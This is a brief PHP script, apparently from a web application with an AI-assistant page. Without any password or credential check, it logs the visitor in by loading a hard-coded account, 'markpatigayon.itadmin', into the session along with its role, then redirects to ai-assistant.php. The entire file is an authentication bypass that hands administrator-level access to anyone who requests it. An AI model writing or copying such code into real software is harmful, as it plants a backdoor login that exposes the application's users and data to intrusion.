<?php
session_start();
require_once 'config/database.php';
require_once 'includes/functions.php';

$conn = getDbConnection();
$res = $conn->query("SELECT * FROM users WHERE username = 'markpatigayon.itadmin' LIMIT 1");
if ($user = $res->fetch_assoc()) {
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $user['username'];
    $_SESSION['role'] = $user['role'];
}
$conn->close();

header("Location: ai-assistant.php");
exit;
?>
